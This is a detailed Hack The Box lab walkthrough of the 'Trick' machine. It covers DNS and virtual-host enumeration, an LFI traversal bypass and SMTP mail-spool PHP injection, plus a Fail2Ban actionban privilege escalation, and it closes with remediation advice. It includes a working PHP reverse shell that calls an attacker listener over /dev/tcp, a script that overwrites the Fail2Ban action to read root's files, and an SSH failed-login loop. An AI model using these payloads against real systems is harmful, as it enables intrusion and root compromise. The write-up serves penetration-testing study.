---
title: 'HTB Trick: Complete Evidence-Led Walkthrough'
description: Evidence-led DNS, virtual-host and LFI enumeration culminating in mail-spool PHP execution and a Fail2Ban root-flag path.
date: 2026-11-12
category: Linux / Web Security
difficulty: Easy
tags:
- Hack The Box
- Linux
- DNS
- LFI
- SMTP
- PHP
- Fail2Ban
published: true
slug: htb-trick
---

# Overview

**Machine:** Trick  
**Platform:** Hack The Box  
**Publication format:** htb-trick.md  

The DNS zone transfer was an important starting clue but did not reveal the decisive marketing virtual host. Targeted hostname fuzzing exposed a file-inclusion defect that was later chained with mail delivery.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

> **Enkidu's Field Notes | CPTS Prep Boxes**  
> **Engagement:** 22–23 October 2026  
> **Target:** `trick.htb`  
> **Original machine IP:** `10.129.88.11`  
> **IP after reset:** `10.129.88.191`  
> **Result:** User compromise confirmed; root flag acquisition reported as successful.  
> **Core chain:** DNS zone transfer → targeted vhost fuzzing → LFI traversal bypass → SMTP mailbox poisoning → PHP execution as `michael` → group-writable Fail2Ban action directory → sudo restart → SSH ban event → root-privileged file read.

---

### Reading this write-up: evidence versus reconstruction

This is a reconstruction of **our actual Trick engagement**, not a copy of a published walkthrough. It combines original terminal captures, the recorded conversation, and the final troubleshooting exchange. To preserve accuracy:

- **Observed** means an output or action was captured in the available terminal logs/conversation.
- **Reported** means the operator confirmed a result but did not paste the final command output.
- **Reproduction example** means a command that demonstrates the established mechanism; the exact historical keystrokes were not preserved.
- Passwords, undisclosed hashes, and unrecorded command outputs are **not invented**.

The user flag was captured; the literal value of `root.txt` was not supplied in the conversation. The final message **“finally”** confirmed completion following the `actionban`/SSH-ban instructions, but did not include a root shell transcript. Therefore this report claims **root flag access**, not an independently demonstrated interactive root session.

### Engagement overview

| Item | Result |
|---|---|
| Machine | Trick - Hack The Box |
| Target domain | `trick.htb` |
| Attack host | Parrot Linux (`enkidu@parrot`, `~/Trick`) |
| Target IP, first session | `10.129.88.11` |
| Target IP, second session | `10.129.88.191` |
| Initial access | LFI of attacker-controlled local mail spool, resulting in PHP code execution |
| User context | `michael`, UID/GID `1001` |
| Additional group | `security` (`1002`) |
| Escalation surface | Group-writable `/etc/fail2ban/action.d/` with sudo restart privilege |
| Root objective | Read `/root/root.txt` by causing Fail2Ban to execute an attacker-changed ban action |

#### Attack path at a glance

```text
10.129.88.11 / 10.129.88.191
          |
          +-- TCP/53: BIND DNS
          |      +-- PTR -> trick.htb
          |      +-- AXFR leaks preprod-payroll.trick.htb
          |
          +-- TCP/80: nginx + name-based virtual hosts
          |      +-- preprod-payroll.trick.htb
          |      |      +-- SQL injection / admin login bypass
          |      |      +-- sqlmap: payroll_db, database user remo
          |      |      `-- FILE-privilege / nginx config investigation: dead end
          |      |
          |      `-- ffuf -> preprod-marketing.trick.htb
          |             +-- page parameter: traversal-filter bypass
          |             +-- /etc/passwd reveals michael
          |             +-- include /var/mail/michael
          |             `-- execute PHP from SMTP-delivered mail
          |
          +-- TCP/25: SMTP
          |      `-- send PHP body to michael's local mailbox
          |
          `-- michael (uid=1001; group=security)
                 +-- sudo: /etc/init.d/fail2ban restart (as root)
                 +-- write access to action.d DIRECTORY
                 +-- replace iptables-multiport.conf action definition
                 +-- restart Fail2Ban, trigger real SSH ban
                 `-- read /root/root.txt via privileged action
```

---

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Reconnaissance: services and initial attack surface

#### Port and service discovery

The recorded reconnaissance identified the following open services:

| Port | Service | Observed identification | Why it mattered |
|---:|---|---|---|
| 22/tcp | SSH | OpenSSH `7.9p1` on Debian 10 | Entry to audit later; ban trigger for Fail2Ban |
| 25/tcp | SMTP | SMTP service reachable | Possible route for placing attacker-controlled text into the local mail spool |
| 53/tcp | DNS | BIND `9.11.5` family | PTR and zone-transfer enumeration |
| 80/tcp | HTTP | nginx `1.14.2` | Name-based virtual hosts; PHP-backed applications |

**Reproduction example - baseline scan:**

```bash
IP=10.129.88.191
sudo nmap -sC -sV -p22,25,53,80 "$IP" -oN trick-targeted.nmap
```

The exact first full-scan command was not retained, so the command above is a reproducible baseline, **not** a claimed historical invocation.

#### DNS PTR and CHAOS version query

From the original attacker terminal:

```bash
dig @10.129.88.11 -x 10.129.88.11
dig @10.129.88.11 version.bind chaos txt
```

Key responses:

```text
11.88.129.10.in-addr.arpa. 604800 IN PTR trick.htb.
version.bind.            0      CH TXT "9.11.5-P4-5.1+deb10u7-Debian"
```

**Interpretation:** Reverse DNS provided a naming root for virtual-host testing; the CHAOS TXT response disclosed a BIND build identifier. Neither alone was compromise, but both were actionable reconnaissance.

#### DNS zone transfer - AXFR

```bash
dig @10.129.88.11 trick.htb AXFR
```

Relevant output captured:

```text
trick.htb.                     IN SOA   trick.htb. root.trick.htb. ...
trick.htb.                     IN NS    trick.htb.
trick.htb.                     IN A     127.0.0.1
trick.htb.                     IN AAAA  ::1
preprod-payroll.trick.htb.     IN CNAME trick.htb.
```

The zone transfer was permitted and leaked a non-obvious application hostname. The apex A/AAAA records resolving to loopback were important: **do not blindly trust the IP in the transferred zone as the remote service address**. The web service was probed on the target machine IP while using the intended HTTP `Host` name.

For example:

```bash
curl -i --resolve trick.htb:80:10.129.88.11 \
  http://trick.htb/

curl -i --resolve preprod-payroll.trick.htb:80:10.129.88.11 \
  http://preprod-payroll.trick.htb/
```

Or add both names to `/etc/hosts` with the current box address:

```text
10.129.88.191 trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb
```

#### Main website versus the payroll application

The `trick.htb` root showed a **“Coming Soon”** template served by nginx `1.14.2`. That minimal-looking page was not a reason to abandon port 80.

The `preprod-payroll.trick.htb` host returned a PHP session cookie and redirected to `login.php`:

```text
HTTP/1.1 302 Found
Server: nginx/1.14.2
Set-Cookie: PHPSESSID=...; path=/
location: login.php
```

The retrieved HTML identified a payroll/recruitment management application, including administrative navigation links such as attendance, payroll, employees, departments, positions, allowances and deductions.

**Methodology note:** A generic landing page and a named business application can be two entirely different attack surfaces despite sharing the same target IP.

---

## Analysis

The payroll SQL injection was investigated and validated but was not the foothold. The practical route came from Windows-style and repeated-separator traversal patterns that disclosed local files, followed by mail-spool content interpreted through PHP include. As michael, control of a group-writable Fail2Ban action directory plus passwordless service restart allowed an actionban event to read a root-protected flag. Restart alone did not trigger the ban action; the event had to fire.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### The payroll SQL injection: real finding, wrong path for initial access

#### Administrative login bypass

The payroll login was vulnerable to SQL injection. During the original session the operator **successfully bypassed login and reached the admin panel**.

The injection was subsequently identified in this request surface:

```text
POST /ajax.php?action=login
Parameter: username
Host: preprod-payroll.trick.htb
```

The precise bypass string typed into the login field was not retained, so it is intentionally not fabricated here.

#### SQLmap investigation

SQLmap identified these databases:

```text
information_schema
payroll_db
```

Later database privilege enumeration identified user `remo`; the returned privilege began with `F` and was interpreted during the engagement as indicating `FILE` privilege. That made server-side file access worth investigating, but **a claimed FILE privilege does not automatically prove unrestricted filesystem reads or writes**. Permissions, SQL server settings, file paths, and the database service identity all matter.

**Reproduction example (request must be captured first):**

```bash
# Save the actual login request from Burp as login.req.
sqlmap -r login.req -p <REDACTED> --batch --dbs
sqlmap -r login.req -p <REDACTED> --batch --current-user --privileges
```

This is a reliable *method* for recreating the investigation; it is not a transcript of the exact SQLmap flags used that day.

#### Incomplete nginx configuration retrieval

The investigation tried to read:

```text
/etc/nginx/sites-enabled/default
```

It produced a suspicious discrepancy:

```text
Remote file size: approximately 1058 bytes
Locally recovered: approximately 36 bytes
Recovered content: server { listen 80 default_server;
```

Retries with SQLmap options including `--hex` and `--fresh-queries` were explored, but the available evidence did **not** establish a complete recovered config or a working file-write-to-webroot exploit.

##### Why this branch mattered

- It confirmed a genuine SQL injection and exposed `payroll_db`.
- It gave a second possible route toward filesystem interaction.
- The partial file output could have consumed excessive time if mistaken for proof that the database route was almost exploitable.
- Moving back to HTTP virtual-host discovery produced a much cleaner initial compromise.

**Decision lesson:** A vulnerability can be real and still be the inferior attack path. Record it, set a time limit, and revisit broad enumeration instead of forcing the chain.

---

### Virtual-host discovery - the decisive web pivot

DNS AXFR disclosed `preprod-payroll`, but **did not disclose the marketing vhost**. The latter was found by fuzzing the `Host` header.

The recorded discovery strategy was:

```bash
ffuf \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://10.129.88.11/ \
  -H 'Host: preprod-FUZZ.trick.htb' \
  -ac -ic -t 100 \
  -of json -o ffuf-vhosts.json
```

A matching result was found:

```text
marketing  ->  preprod-marketing.trick.htb
Status: 200
Response size: 9660 bytes
```

**Why the technique worked:** The server used virtual hosting. A wordlist appended to the already observed `preprod-` naming convention targeted the probable internal naming scheme rather than fuzzing the root hostname indiscriminately.

**Why `-ac` helped:** Default or unknown hostnames can resolve to nearly identical catchall responses. Auto-calibration reduces this false-positive noise.

**CPTS takeaway:** DNS zone transfer and vhost fuzzing are complementary, not substitutes. AXFR may reveal only part of a web estate.

---

### Local File Inclusion on the marketing site

#### Attackable parameter

The new host exposed a PHP page parameter. The successful traversal-filter-bypass form in the recorded session was:

```text
http://preprod-marketing.trick.htb/index.php?page=....//....//...//etc/passwd
```

> Preserve the original punctuation when reproducing from notes; the exact number of traversals can depend on the include path. If testing from scratch, compare raw `../`, encoded traversal, and the `....//` variant against distinct known files.

The response revealed the local user entry:

```text
michael:x:1001:1001::/home/michael:/bin/bash
```

This was decisive because it supplied a valid local account name, a plausible mailbox recipient, and a concrete target for subsequent post-compromise enumeration.

#### Why `....//` can defeat naive filtering

Some applications try to prevent directory traversal with a single replacement that strips `../` from a submitted string. A token such as:

```text
....//
```

can be reduced by that replacement into a new `../` sequence. This is a **non-recursive sanitization bypass**. The reliable fix is not repeated string replacement; it is strict mapping to allowed include targets, canonical path resolution, and confinement to a predetermined directory.

#### Capability before escalation

At this point we had an **LFI**, not yet a shell. The next question was not “Can I read more random files?” but:

> Can I make a local file contain PHP that the `page` include mechanism will evaluate?

SMTP on port 25 provided an answer.

---

### Chaining SMTP mailbox poisoning with LFI to obtain PHP execution

#### SMTP accepted local delivery

During testing, the SMTP server accepted mail directed to:

```text
MAIL FROM:<REDACTED>@localhost>
RCPT TO:<REDACTED>@debian.localdomain>
```

The payload was then included via Michael’s local mailbox:

```text
/var/mail/michael
```

This is fundamentally different from a standalone LFI: we controlled **both the content of an existing local file** (through SMTP delivery) and **the filename passed into a PHP include sink** (through `page`).

#### Conceptual mail-poisoning sequence

The following illustrates the proven mechanism; the full raw SMTP dialogue was not preserved in the available terminal paste:

```bash
nc 10.129.88.191 25
```

```smtp
EHLO localhost
MAIL FROM:<REDACTED>@localhost>
RCPT TO:<REDACTED>@debian.localdomain>
DATA
Subject: RCE test

<?php echo "RCE_TEST"; ?>
.
QUIT
```

Then cause the marketing page to include the mail spool, adapting the traversal depth if necessary:

```text
/index.php?page=....//....//...//var/mail/michael
```

**Observed proof:** The included mailbox returned:

```text
RCE_TEST
```

That established execution of injected PHP, rather than mere disclosure of mail content.

#### Command execution verification

A second injected PHP test was recorded:

```php
<?php echo shell_exec("id"); ?>
```

The result was:

```text
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

The output is important for two reasons: (1) the code was running as a real OS account rather than in a harmless preview, and (2) `security` immediately became a group worth investigating.

#### Interactive shell

The reverse-shell payload discussed and used in the recorded exchange targeted the attacker VPN listener `10.10.15.31:4444`:

```php
<?php system("bash -c \"bash -i >& /dev/tcp/10.10.15.31/4444 0>&1\""); ?>
```

An attacker-side listener for that payload is:

```bash
nc -lvnp 4444
```

A subsequent terminal capture shows the shell at:

```text
michael@trick:/var/www/market$
```

The engagement therefore establishes access as `michael` via the **mail-poisoning/LFI/PHP route**. An SSH private key was discussed elsewhere during troubleshooting, but the recovered evidence does not show that SSH key authentication was needed for initial compromise; this write-up does not attribute the foothold to an unverified SSH login.

#### User flag

After `cd` to the home directory, the operator ran:

```bash
id
cd ~
ls
cat user.txt
```

The terminal output confirmed the user flag was retrieved from:

```text
/home/michael/user.txt
```

Captured value:

```text
[REDACTED_HEX]
```

---

### Linux enumeration - follow the `security` group

#### Effective identity

```bash
id
```

Actual output:

```text
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Rather than immediately launching a generic exploit script, the next high-signal steps were `sudo -l`, group-writable paths, and service configuration review.

#### Sudo privilege

```bash
sudo -l
```

Output:

```text
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

This does **not** grant arbitrary command execution by itself. It delegates a privileged *service restart*. The weakness arises if the service loads lower-trust configuration containing shell commands.

#### Directory ownership and permissions

```bash
ls -la /etc/fail2ban/
ls -la /etc/fail2ban/action.d/
find /etc/fail2ban -writable -ls 2>/dev/null
```

Important evidence:

```text
drwxrwx--- 2 root security 4096 ... /etc/fail2ban/action.d
-rw-r--r-- 1 root root 1420 ... iptables-multiport.conf
```

The writable scan reported the **directory**, not the configuration file:

```text
/etc/fail2ban/action.d
```

This nuance matters a great deal.

- The file `iptables-multiport.conf` was **root-owned and mode `0644`**, so `michael` could not simply edit its bytes in place as an ordinary write operation.
- The parent directory was **group-writable by `security`**, and `michael` belonged to that group.
- On a normal Unix filesystem, write and execute permissions on a directory permit creating/removing/replacing entries in it, subject to sticky bits, ACLs, and other constraints. The observed mode did not show a sticky bit.
- Therefore a modified file can often be prepared under `/tmp/` and moved into the action directory to **replace the filename**, despite the original file not being directly writable.

**Privilege-boundary error:** untrusted membership in a group with write access to configuration interpreted by a root-run service.

#### Fail2Ban jail configuration

The captured `/etc/fail2ban/jail.conf` included:

```ini
[DEFAULT]
bantime  = 10s
findtime = 10s
maxretry = 5
...
banaction = iptables-multiport
```

It also contained an `[sshd]` jail section. `/etc/fail2ban/jail.local` was absent:

```text
cat: /etc/fail2ban/jail.local: No such file or directory
```

**Interpretation:** The `iptables-multiport` action was configured as the default banning action, and the timing values suggested an SSH-ban test would be practical. The available excerpt does not show the effective merged jail status after all `jail.d` overrides; the final operator confirmation, however, followed triggering a ban.

To audit the active runtime in a reproduction:

```bash
fail2ban-client status
fail2ban-client status sshd
```

Those two commands are verification suggestions, not copied output from the completed attempt.

---

### Failed attempt: changing `/bin/bash` permissions did not confer root

The first exploitation attempts tried to make Fail2Ban run:

```bash
chmod u+s /bin/bash
```

The intention was to set the SUID bit on `/bin/bash` so that a later execution with `bash -p` would preserve elevated privileges.

The operator inspected the file afterward:

```bash
ls -lah /bin/bash
```

Observed output:

```text
-rwxrwxrwx 1 root root 1.2M Apr 18  2019 /bin/bash
```

**This was not success.** The permission string was `rwxrwxrwx`, not `rwsrwxrwx`; the SUID bit was absent. Ordinary `777` permissions are not equivalent to root execution. The transcript does not establish what earlier action produced the unusual world-writable mode.

#### Why the early approach failed

The most important distinction was between Fail2Ban's different action hooks:

| Hook | Typical execution event | Relevance |
|---|---|---|
| `actionstart` | A jail/action is initialized | Can run on jail startup when the action is active |
| `actionstop` | A jail/action is stopped | Cleanup path |
| `actioncheck` | Action state is checked | Health/recovery path |
| `actionban` | A source IP is banned | **Reliable target once a ban event is deliberately triggered** |
| `actionunban` | A ban is removed | Later cleanup path |

A successful:

```bash
sudo /etc/init.d/fail2ban restart
```

does **not** imply that an `actionban` command executed. Restarting and banning are distinct service events. That was the major troubleshooting issue.

**Lesson:** A privileged service call only helps when the attacker-controlled command is on the event path that actually runs.

---

### Successful escalation route - controlled `actionban`

#### Objective: root-privileged file read, not a persistent root shell

At the final revisit the operator needed **only the root flag**. Instead of spending time trying to create a durable SUID shell, the selected payload made a root-run Fail2Ban action copy the target file into a user-readable location.

Desired injected action:

```ini
actionban = /bin/sh -c 'cp /root/root.txt /tmp/trick-root.txt && chmod 644 /tmp/trick-root.txt'
```

A process running as root can read `/root/root.txt`; if the action executes successfully, the copy in `/tmp` becomes readable to `michael`.

#### How to change a root-owned action file via a group-writable directory

If in-place editing is denied, prepare a replacement and move it across the directory boundary. This reconstruction reproduces the mechanics without asserting that every one of these commands was typed verbatim:

```bash
cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf

python3 - <<'PY'
from pathlib import Path
import re

p = Path('/tmp/iptables-multiport.conf')
s = p.read_text()
new_action = (
    "actionban = /bin/sh -c 'cp /root/root.txt "
    "/tmp/trick-root.txt && chmod 644 /tmp/trick-root.txt'"
)
s, n = re.subn(r'(?m)^actionban\s*=.*$', lambda _: new_action, s, count=1)
if n != 1:
    raise SystemExit('Expected one actionban directive; review file manually')
p.write_text(s)
PY

# Directory write permission can allow replacement even if original is root:root 0644.
mv /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf

grep -n '^actionban' /etc/fail2ban/action.d/iptables-multiport.conf
```

**Caution:** Action definitions can contain continuation lines, substitution syntax, and parent includes. Inspect the entire `[Definition]` stanza before and after modification; replacing only a single line is appropriate only when that directive is actually single-line. The key exploitable property is the ability to replace a trusted config filename, not this particular editor script.

#### Restart under the permitted sudo rule

```bash
sudo /etc/init.d/fail2ban restart
```

This makes the daemon reload its action configuration. Do not mistake the restart itself for evidence the ban-action command has been reached.

#### Trigger an SSH ban from a separate attacking terminal

The recorded final plan explicitly retained the existing `michael` shell and generated failed SSH authentication attempts to cause a Fail2Ban **ban event**:

```bash
for i in {1..10}; do
    sshpass -p '<REDACTED>' ssh \
      -o StrictHostKeyChecking=no \
      -o PubkeyAuthentication=no \
      -o PreferredAuthentications=password \
      invaliduser@10.129.88.191 true
done
```

Remember the configuration values:

```text
maxretry = 5
findtime = 10s
bantime  = 10s
```

To be detected, sufficient failures must register within the effective `findtime` window, and the `sshd` jail must be enabled and using this action. `sshpass`/SSH negotiation delays can matter. Retain the existing reverse shell because Fail2Ban can temporarily block the attacking IP from SSH.

The final exchange shows this instruction followed by the operator's **“finally”**. There is no subsequent pasted Fail2Ban log or copy-command output; the successful flag retrieval is therefore **operator-confirmed**, rather than supported by a captured `cat` output.

#### Retrieve the flag as Michael

```bash
ls -l /tmp/trick-root.txt
cat /tmp/trick-root.txt
```

**Outcome:** Root flag reportedly retrieved. The actual 32-character `root.txt` value was not included in the available record and is deliberately not fabricated.

#### Why this crosses the trust boundary

```text
Unprivileged michael
    |
    +-- member of security (group 1002)
    |
    +-- can replace entries in /etc/fail2ban/action.d/
    |
    +-- installs malicious iptables-multiport action
    |
    +-- sudo permits root service restart
    |
    +-- root-owned Fail2Ban loads altered action
    |
    +-- SSH failures satisfy ban threshold
    |
    `-- Fail2Ban executes actionban as root
           `-- protected root flag copied to a readable location
```

This is **configuration-driven command execution via a privileged service**, enabled by directory ACL/ownership misconfiguration plus restricted-but-dangerous sudo delegation. Neither directory write access alone nor a restart alone proves the exploit: the configuration must be consumed and the relevant event fired.

---

### Dead ends, mistakes, and debugging lessons

| Observation / attempted path | Why it did not finish the box | Better decision rule |
|---|---|---|
| Payroll login SQL injection | Confirmed admin access and DB enumeration, but filesystem exploitation was not proven | Keep SQLi as a finding; switch branches when the next prerequisite is unverified |
| SQLmap nginx `--file-read` | Retrieved far fewer bytes than claimed remote size | Compare size, inspect raw file, retry carefully, then stop if inconsistent |
| Only the AXFR-revealed hostname | DNS provided `preprod-payroll`, **not** the vulnerable marketing host | Follow zone transfer with targeted vhost fuzzing |
| Blind attention to the root “Coming Soon” page | Hides name-based applications behind one nginx listener | Test alternative `Host` headers against the target IP |
| Treating LFI as only file disclosure | Misses the opportunity to include an attacker-controlled mailbox | Search for writable or externally populated local files |
| Assuming root-owned file cannot be replaced | The **directory** was writable by `security` | Assess directory permissions and effective group access independently of file mode |
| `chmod u+s /bin/bash` without checking execution path | `/bin/bash` remained without SUID bit | Match injected action hook to a real trigger and verify effects |
| Restarting Fail2Ban but not provoking a ban | Service start/restart is not an `actionban` event | Deliberately trigger and observe the action's lifecycle event |
| Continuing after the only objective is the flag | A persistent root shell was unnecessary to retrieve `/root/root.txt` | Use the least complex proof that meets the lab objective |
| SSH password attack using `rockyou.txt` in NetExec | Session showed `UnicodeDecodeError` due to non-UTF-8 characters | Fix password-file encoding if genuinely necessary; do not confuse a tooling error with evidence of a valid password |

#### The observed NetExec wordlist issue

Near the end of the previous session, the operator also tried:

```bash
netexec ssh trick.htb -u enk -p <REDACTED>
```

NetExec emitted:

```text
UnicodeDecodeError: Could not decode password file.
Make sure the file only contains UTF-8 characters.
... option '--ignore-pw-decoding'
```

This did not contribute to the successful attack chain. It illustrates a separate quality-control rule: **check scanner input validity before interpreting the absence of results**. A large wordlist is useful only if the tool reads it correctly.

---

## Impact

The user shell and user flag are directly evidenced; root-flag access was reported by the operator after the modified actionban and SSH-ban sequence. An interactive root shell was not documented.

### Chronological evidence ledger

| Stage | Recorded evidence | Confidence |
|---|---|---|
| DNS host discovery | PTR result for `trick.htb` | Observed |
| BIND discovery | `version.bind` identified Debian BIND `9.11.5` build | Observed |
| AXFR | `preprod-payroll.trick.htb` leaked as CNAME | Observed |
| Payroll application | nginx redirect to PHP `login.php`, payroll UI | Observed |
| Payroll SQL injection | Admin login bypass; `ajax.php?action=login`, `username` | Conversation-recorded |
| DB enumeration | `payroll_db`, `information_schema`, `remo` privilege investigation | Conversation-recorded |
| Additional vhost | `marketing` ffuf result, status 200, size 9660 | Conversation-recorded |
| LFI | Traversal URL reads `/etc/passwd`, user `michael` | Conversation-recorded |
| PHP in mailbox | `RCE_TEST` marker when including `/var/mail/michael` | Conversation-recorded |
| Command execution | `shell_exec('id')` executes as `michael` | Conversation-recorded |
| User access | Shell captured at `/var/www/market`; `id`; `user.txt` | Observed |
| Sudo | `NOPASSWD: /etc/init.d/fail2ban restart` | Observed |
| Writable action directory | `root:security`, mode `0770`; original action file `root:root`, `0644` | Observed |
| First privilege attempt | `/bin/bash` stayed `-rwxrwxrwx`, not SUID | Observed |
| Root-flag route | Alter `actionban`, restart, trigger SSH ban, read copied flag | Final instructions followed by operator confirmation |
| Actual root flag string | Not present in surviving conversation | **Not recorded** |
| Interactive UID 0 shell | Not demonstrated in surviving conversation | **Not claimed** |

---

### Final assessment

**Trick was not primarily a test of exploit complexity; it tested attack-surface coverage and event-driven privilege escalation.**

The successful choices were to treat exposed DNS data as a lead rather than a complete host inventory, to return from an attractive but costly SQL-injection rabbit hole to vhost enumeration, to turn a file-read flaw into code execution by identifying a locally delivered mail file, and finally to connect a writable service-action directory with a privileged but narrowly scoped sudo restart.

The last obstacle was operational: **the payload must sit in a Fail2Ban action that actually runs.** A restart was not a ban event. Explicitly generating an SSH ban made the difference.

> **Field-manual rule:** *Before declaring a privilege-escalation primitive broken, identify exactly which daemon event executes the attacker-controlled bytes. Verify the event, the executing identity, and the side effect separately.*

**Outcome:** `michael` compromise directly observed; root-flag retrieval operator-confirmed on 23 October 2026. No walkthrough was consulted to reconstruct this engagement.

---

#### Appendix A - minimal command reference

```bash
# Target identification and virtual hosts
IP=10.129.88.191
dig @"$IP" -x "$IP"
dig @"$IP" trick.htb AXFR
curl -i --resolve preprod-payroll.trick.htb:80:"$IP" \
  http://preprod-payroll.trick.htb/

# Targeted virtual-host fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u "http://$IP/" -H 'Host: preprod-FUZZ.trick.htb' \
  -ac -ic -t 100 -of json -o ffuf-vhosts.json

# Post-compromise privilege checks
id
sudo -l
find /etc/fail2ban -writable -ls 2>/dev/null
grep -nE 'banaction|^\[sshd\]|maxretry|findtime|bantime' /etc/fail2ban/jail.conf

grep -nE '^action(start|stop|check|ban|unban)' \
  /etc/fail2ban/action.d/iptables-multiport.conf

# Allowed privileged operation
sudo /etc/init.d/fail2ban restart

# Final objective check after a real ban event
ls -l /tmp/trick-root.txt
cat /tmp/trick-root.txt
```

#### Appendix B - evidence preservation notes

For a future portfolio-quality case study, save scan XML/normal output, `ffuf` JSON, redacted Burp requests for the payroll login and marketing LFI, the raw successful SMTP exchange, and before/after copies of the Fail2Ban action stanza. Capture the Fail2Ban log entry for the ban and the final `ls`/`cat` evidence without exposing the root flag publicly. Those attachments would convert several conversation-supported stages into fully reproducible primary-source evidence.


#### Appendix C - focused troubleshooting guide for event-driven escalation

The last stage of Trick is especially useful for CPTS-style testing because three separate requirements must line up before the payload fires.

| Requirement | How to verify | Failure symptom |
|---|---|---|
| **Configuration control** | Confirm the file name used by `banaction` and inspect the action after replacement | The malicious command exists in a file Fail2Ban never references |
| **Configuration consumption** | Restart the daemon using the allowed sudo entry and confirm it loads without errors | Restart errors, old actions remaining active, or a jail not started |
| **Event delivery** | Generate enough SSH authentication failures in the configured `findtime`; inspect jail status and logs when permitted | Service restarted cleanly, but no copy or marker ever appears |
| **Execution identity** | Use an innocuous side effect to establish the action was executed with the expected permissions | The action runs but fails reading `/root/root.txt` |
| **Outcome proof** | Check the copied file's existence, owner/mode, and contents | An assumed success is mistaken for an actually retrieved flag |

**Boundary conditions to remember:** An SSH ban may block the attacker from creating further SSH connections, so preserve the established foothold. The `iptables-multiport` action can be loaded through an active jail, but a restart alone is *not* a substitute for a ban. If the ban lasts only seconds, a fast feedback loop and reliable failure generation matter more than extending a brute-force wordlist.

The distinctive lesson from this engagement is not merely “writable Fail2Ban configuration = privilege escalation”; it is **writable root-consumed configuration + a controllable root service reload + a deliberately triggered execution event**.

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### CPTS methodology to carry forward

#### Enumeration checklist

- [x] Identify TCP services and map them to distinct attack surfaces.
- [x] Investigate DNS PTR, version disclosure, and AXFR when port 53 is open.
- [x] Use the correct host header rather than relying on target-IP browsing.
- [x] Discover additional vhosts with a sufficiently large, relevant wordlist.
- [x] Record actual response signatures to separate catchall hosts from applications.
- [x] Audit login requests for injection but set a time limit on slow exploitation branches.
- [x] Test LFI with a known file and examine normalization/sanitization behavior.
- [x] Look for files that network services populate (`/var/mail`, logs, sessions, etc.).
- [x] Verify code execution using benign deterministic markers and `id`.
- [x] Enumerate effective UID, supplemental groups, `sudo -l`, and writable directories.
- [x] Trace privileged service hooks instead of assuming a restart executes every action.
- [x] Verify the precise success condition before declaring a path complete.

#### Generalized troubleshooting pattern

1. **Proof of reachability:** Does the service actually receive the attacker-generated event?
2. **Proof of parsing:** Is the modified action file read and syntactically valid?
3. **Proof of privilege:** Which user executes the action?
4. **Proof of execution:** Is there an observable side effect (marker file, command result)?
5. **Proof of objective:** Can the desired protected resource be accessed?

This sequence would have shortened the failed SUID attempt considerably.

---

### Security impact and remediation

The engagement exposed multiple independent security findings; the final compromise was possible because they chained.

| Finding | Impact | Remediation |
|---|---|---|
| DNS AXFR available to untrusted clients | Leaks internal/preproduction names and infrastructure clues | Restrict zone transfers to approved secondary DNS servers and authenticate where supported |
| Payroll SQL injection | Bypasses authentication; risks database disclosure or broader DB compromise | Parameterized SQL, constrained DB privileges, server-side authentication checks |
| Marketing page LFI | Arbitrary local file disclosure; escalates when attacker-controlled files are included | Strict allowlist of page identifiers, canonical path confinement, never include arbitrary requested paths |
| PHP execution of mail spool | Converts unauthenticated SMTP delivery + LFI into OS command execution | Separate untrusted mail data from executable includes; eliminate the LFI sink and prevent interpreting raw content as PHP |
| `security` group write access to Fail2Ban actions | Lets non-root members replace configuration subsequently interpreted by root | Restrict `/etc/fail2ban/action.d/` to trusted root administrators; review directory/file ACLs |
| Passwordless sudo service restart | Allows lower-privilege user to force privileged config reloads | Remove unnecessary restart permission; use a carefully controlled service-management workflow and protect consumed configs |
| Privileged action command executed on ban | Root-context actions become code-execution primitives when action file is replaced | Protect action integrity, monitor action-file changes, and minimize privileges wherever possible |

**Severity in context:** The final misconfiguration allows an authenticated, lower-privileged user to cause root-context command execution under the described event conditions. The externally reachable chain adds LFI-to-RCE and a route to reach that user context.

---
